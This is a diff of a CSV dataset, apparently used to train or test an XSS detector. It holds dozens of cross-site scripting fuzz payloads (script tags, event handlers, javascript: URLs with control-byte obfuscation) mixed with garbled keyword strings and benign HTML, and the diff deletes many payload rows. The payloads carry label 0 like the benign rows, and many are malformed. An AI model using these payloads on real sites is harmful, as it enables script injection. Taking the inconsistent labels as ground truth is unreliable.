@@ -68,66 +68,17 @@ fi_ne ca>sino koda?k und[ertake h}ook road-s ple-nty fi|le al_t a;pplicable k~im
 "jagua}r dru(nk bra\ve seatin_g de[tect kij/iji od*ds guar<antee recruitme{nt pl,us s@aturn p=eoples",0
 "humidi&ty top~s ense`mble ch,arts u|rw",0
 "a href=""\x00javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",0
-"<a href=""\x10javascript:javascript:alert(1)"" id=""fuzzelement1"">test/a>",0
-"<a href=""\xE2\x80\x82javascript:javascript:alert(1)"" id=""fuzzelement1"">test/a>",0
-"a href=""\x15javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",0
-"<a href=""\x1Cjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a",0
-"a href=""javascript\x0D:javascript:alert(1)"" id=""fuzzelement1"">test</a>",0
-"<a href=""javascript\x0A:javascript:alert(1)"" id=""fuzzelement1"">test/a>",0
 "`""'>img src=xxx:x \x0Aonerror=javascript:alert(1)>",0
-"`""'>img src=xxx:x \x22onerror=javascript:alert(1)>",0
-"`'><script\x00javascript:alert(1)</script>,0
-`'<script>\xE2\x80\xA8javascript:alert(1)</script>",0
-"`'><script>\xE2\x80\x8Ajavascript:alert(1)/script>,0
-`'><script\xE1\x9A\x80javascript:alert(1)</script>",0
-"`'><script\x0Cjavascript:alert(1)</script>,0
-`'><script>\x2Bjavascript:alert(1)</script",0
-"`'>script>\xF0\x90\x96\x9Ajavascript:alert(1)</script>,0
-`'><script>-javascript:alert(1)</script",0
-"`'><script>\x0Ajavascript:alert(1)</script,0
-`'>script>\xE2\x80\xAFjavascript:alert(1)</script>",0
-"`'><script\x7Ejavascript:alert(1)</script>,0
-`'<script>\xE2\x80\x87javascript:alert(1)</script>",0
-"`'><script\xE2\x81\x9Fjavascript:alert(1)</script>,0
-`'>script>\xE2\x80\xA9javascript:alert(1)</script>",0
-"`'><script\xC2\x85javascript:alert(1)</script>,0
-`'>script>\xEF\xBF\xAEjavascript:alert(1)</script>",0
-"`'<script>\xE2\x80\x83javascript:alert(1)</script>,0
-`'>script>\xE2\x80\x8Bjavascript:alert(1)</script>",0
-"`'<script>\xEF\xBF\xBEjavascript:alert(1)</script>,0
-`'><script>\xE2\x80\x80javascript:alert(1)/script>",0
-"`'><script>\x21javascript:alert(1)/script>,0
-`'><script\xE2\x80\x82javascript:alert(1)</script>",0
-"`'<script>\xE2\x80\x86javascript:alert(1)</script>,0
-`'><script>\xE1\xA0\x8Ejavascript:alert(1)</script",0
-"`'<script>\x0Bjavascript:alert(1)</script>,0
-`'><script\x20javascript:alert(1)</script>",0
-"`'>script>\xC2\xA0javascript:alert(1)</script>,0
-/><img/onerror=\x0Bjavascript:alert(1)\x0Bsrc=xxx:x /",0
-"/><img/onerror=\x22javascript:alert(1)\x22src=xxx:x /,0
-/>img/onerror=\x09javascript:alert(1)\x09src=xxx:x />",0
-"/>img/onerror=\x27javascript:alert(1)\x27src=xxx:x />,0
-/>img/onerror=\x0Ajavascript:alert(1)\x0Asrc=xxx:x />",0
-<script\x09javascript:alert(1)</script>,0
-"`""'>img src=xxx:x onerror\x0B=javascript:alert(1)>",0
 <scriptjavascript:alert(1)<\x00/script>,0
 "<img src=# onerror\x3D""javascript:alert(1)""",0
-<input onfocus=javascript:alert(1) autofocus,0
-<input onblur=javascript:alert(1) autofocus>input autofocus>,0
 video poster=javascript:javascript:alert(1)//,0
-<body onscroll=javascript:alert(1)><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br>br><br><br><br><br><br>...<br><br><br><br><input autofocus>,0
-<form id=test onforminput=javascript:alert(1)<input></form><button form=test onformchange=javascript:alert(1)>X,0
 "<video><source onerror=""javascript:javascript:alert(1)""",0
 "<video onerror=""javascript:javascript:alert(1)""<source>",0
 "<form<button formaction=""javascript:javascript:alert(1)"">X",0
 body oninput=javascript:alert(1)><input autofocus>,0
-"<math href=""javascript:javascript:alert(1)"">CLICKME</math>  <math <maction actiontype=""statusline#http://google.com"" xlink:href=""javascript:javascript:alert(1)"">CLICKME</maction> </math>",0
 frameset onload=javascript:alert(1)>,0
 "table background=""javascript:javascript:alert(1)"">",0
 "<!--<img src=""-->img src=x onerror=javascript:alert(1)//"">",0
-"<comment><img src=""</comment<img src=x onerror=javascript:alert(1))//"">",0
-"<![>img src=""]><img src=x onerror=javascript:alert(1)//"">",0
-"<style><img src=""/style><img src=x onerror=javascript:alert(1)//"">",0
 <SCRIPT FOR=document EVENT=onreadystatechange>javascript:alert(1)</SCRIPT,0
 "<OBJECT CLASSID=""clsid:333C7BC4-460F-11D0-BC04-0080C7055A83""<PARAM NAME=""DataURL"" VALUE=""javascript:alert(1)""></OBJECT>",0
 <b <scriptalert(1)</script>0,0
@@ -138,17 +89,8 @@ frameset onload=javascript:alert(1)>,0
 "image src=""javascript:alert(1)"">",0
 "<script src=""javascript:alert(1)""",0
 div style=width:1px;filter:glow onfilterchange=javascript:alert(1)>x,0
-"<? foo="">script>javascript:alert(1)</script>"">",0
-"<! foo=""><script>javascript:alert(1)</script>""",0
-"</ foo=""><scriptjavascript:alert(1)</script>"">",0
-"<? foo=""><x foo='?><scriptjavascript:alert(1)</script>'>"">",0
-"<! foo=""[[[Inception]]""><x foo=""]foo><script>javascript:alert(1)</script>""",0
-"<% foo><x foo=""%>script>javascript:alert(1)</script>"">",0
 "<div id=d><x xmlns=""<iframe onload=javascript:alert(1)""></div> <script>d.innerHTML=d.innerHTML</script>",0
 "<img \x00src=x onerror=""alert(1)""",0
-"<img \x47src=x onerror=""javascript:alert(1)""",0
-"img \x11src=x onerror=""javascript:alert(1)"">",0
-"img \x12src=x onerror=""javascript:alert(1)"">",0
 <option>See our customer testimonials</option>,0
 <tr>Join our community forum</tr>,0
 <section>Download our brochure</section>,0
